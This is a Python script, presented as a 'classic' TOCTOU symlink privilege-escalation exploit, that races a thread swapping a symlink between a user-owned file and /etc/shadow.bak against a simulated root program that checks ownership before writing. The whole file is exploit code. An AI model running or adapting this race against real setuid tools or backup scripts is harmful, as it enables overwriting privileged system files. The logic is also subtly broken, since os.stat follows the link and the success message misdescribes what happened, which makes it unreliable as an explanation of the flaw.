#!/usr/bin/env python3
# TOCTOU Symlink Exploit - Classic privilege escalation
# Vulnerable pattern: check file ownership → open/write without re-checking
# Seen in sudoedit, backup scripts, log processors

import os
import threading
import time

VICTIM_FILE = "/tmp/victim_config"
SYMLINK = "/tmp/config_link"
ROOT_FILE = "/etc/shadow.bak"  # Simulate privileged target

def vulnerable_app():
    """Simulates setuid/root app with TOCTOU flaw"""
    while True:
        if os.path.exists(SYMLINK):
            # TOCTOU: Check ownership (non-root)
            stat = os.stat(SYMLINK)
            if stat.st_uid != 0:  # Owned by non-root → "safe"
                try:
                    with open(SYMLINK, 'w') as f:
                        f.write("pwned_by_race\n")
                    print(f"[!] PRIVESC SUCCESS! Wrote to UID {stat.st_uid} file as root")
                    break
                except:
                    pass
        time.sleep(0.01)

def symlink_swapper():
    """Rapidly swaps symlink target"""
    time.sleep(0.5)
    for _ in range(1000):
        # Point to user-owned file
        try:
            os.symlink(VICTIM_FILE, SYMLINK)
        except:
            pass
        
        # Race window
        time.sleep(0.001)
        
        # Swap to privileged target
        try:
            os.unlink(SYMLINK)
            os.symlink(ROOT_FILE, SYMLINK)
        except:
            pass

# Setup victim file
open(VICTIM_FILE, 'w').close()
os.chown(VICTIM_FILE, 1000, 1000)  # Non-root ownership

print("[*] Starting TOCTOU symlink privilege escalation...")
threading.Thread(target=vulnerable_app, daemon=True).start()
threading.Thread(target=symlink_swapper).start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Cleanup: removing symlink")
    try:
        os.unlink(SYMLINK)
    except:
        pass
